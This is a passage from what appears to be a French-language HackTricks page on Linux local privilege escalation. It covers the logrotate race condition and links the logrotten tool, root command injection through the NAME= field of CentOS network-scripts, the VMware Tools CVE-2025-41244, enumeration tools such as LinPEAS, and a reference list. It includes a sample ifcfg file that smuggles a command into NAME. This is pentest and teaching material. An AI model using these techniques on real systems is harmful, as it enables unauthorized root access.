> Cette vulnérabilité affecte `logrotate` version `3.18.0` et antérieure

Des informations plus détaillées sur la vulnérabilité sont disponibles sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs nginx),** donc chaque fois que vous découvrez que vous pouvez modifier des logs, vérifiez qui les gère et si vous pouvez escalader les privilèges en remplaçant les logs par des liens symboliques.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Référence de la vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Si, pour quelque raison que ce soit, un utilisateur peut **écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** **modifier** un script existant, alors votre **système est pwned**.<sup>[[20]](#references)</sup>

Les scripts réseau, comme _ifcg-eth0_, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourced\~ sous Linux par Network Manager (dispatcher.d).

Dans mon cas, l’attribut `NAME=` de ces scripts réseau n’est pas traité correctement. Si le nom contient un **espace blanc/espace**, le système tente d’**exécuter la partie située après l’espace blanc**. Cela signifie que **tout ce qui suit le premier espace est exécuté en tant que root**.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Notez l’espace entre Network et /bin/id_)

### **init, init.d, systemd et rc.d**

Le répertoire `/etc/init.d` contient les **scripts** de System V init (SysVinit), le **système classique de gestion des services Linux**. Il inclut des scripts permettant de `start`, `stop`, `restart` et parfois `reload` les services. Ceux-ci peuvent être exécutés directement ou via les liens symboliques présents dans `/etc/rc?.d/`. Un autre chemin utilisé sur les systèmes Redhat est `/etc/rc.d/init.d`.

En revanche, `/etc/init` est associé à **Upstart**, un système plus récent de **gestion des services** introduit par Ubuntu, qui utilise des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés parallèlement aux configurations Upstart grâce à une couche de compatibilité intégrée à Upstart.

**systemd** s’impose comme un gestionnaire moderne d’initialisation et de services, offrant des fonctionnalités avancées telles que le démarrage à la demande des daemons, la gestion de l’automontage et les snapshots de l’état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les packages de distribution et dans `/etc/systemd/system/` pour les modifications effectuées par les administrateurs, simplifiant ainsi le processus d’administration système.<sup>[[21]](#references)</sup>

## Autres techniques

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Évasion de restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Les Android rooting frameworks interceptent généralement un syscall afin d’exposer des fonctionnalités privilégiées du kernel à un manager en userspace. Une authentification faible du manager (par exemple, des vérifications de signature basées sur l’ordre des FD ou de mauvais schémas de mots de passe) peut permettre à une application locale d’usurper l’identité du manager et d’obtenir une escalation vers root sur des appareils déjà rootés. En savoir plus et consulter les détails de l’exploitation ici :


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

La découverte de services basée sur des regex dans VMware Tools/Aria Operations peut extraire un chemin de binaire depuis les lignes de commande des processus et l’exécuter avec -v dans un contexte privilégié. Des patterns permissifs (par exemple, utilisant \S) peuvent correspondre à des listeners placés par l’attaquant dans des emplacements accessibles en écriture (par exemple, /tmp/httpd), ce qui peut conduire à une exécution en tant que root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

En savoir plus et consulter un pattern généralisé applicable à d’autres stacks de découverte/monitoring ici :

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protections de sécurité du kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Aide supplémentaire

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Outils Linux/Unix de Privesc

### **Meilleur outil pour rechercher les vecteurs d’escalade de privilèges locale sous Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum** : [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(option -t)\
**Enumy** : [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check :** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker :** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot :** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop :** Énumère les vulnérabilités du kernel sous Linux et MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit :** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester :** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accès physique) :** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Compilation d’autres scripts** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Privesc via Crontab UI, réutilisation de credentials avec zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era : payload .text_sig forgé pour un monitor exécuté par cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025 : Neighborhood Watch Bypass (détournement de PATH via sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalade de privilèges Linux de base](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guide d’escalade de privilèges Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attack and Defend : techniques d’escalade de privilèges Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Personne ne s’attendait à une exécution de commande !](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (escalade de privilèges Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Guide des exercices du Lab - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation : conseils et techniques pour la Priv Escalation sous Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i : outil d’énumération et d’escalade de privilèges Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Qu’est-ce qu’un socket ?](https://www.linux.com/news/what-socket/)
- [15] [Writeup de Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Accéder à D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Exécutables SUID et escalade de privilèges Linux](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo partie 2 – escalade de privilèges Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Comment gérer les ACL sous Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root sur Redhat/CentOS via network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Qu’est-ce que systemd ?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (injection arithmétique Bash via les logs, chaîne complète)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manuel GNU Bash – BASH_ENV (fichier de démarrage non interactif)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + privesc via lien symbolique TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copie cron de pg_basebackup → Bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Vous le nommez, VMware l’élève (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463 : élévation de privilèges Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnérabilités d’élévation de privilèges Sudo CVE-2025-32462 et CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB : Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Répertoires de dépôt PYC](https://peps.python.org/pep-3147/)
- [32] [Documentation Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [problème #74 de polkit/polkit](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet de @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Journalisation des mots de passe sous Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Détails d’une race condition de Logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
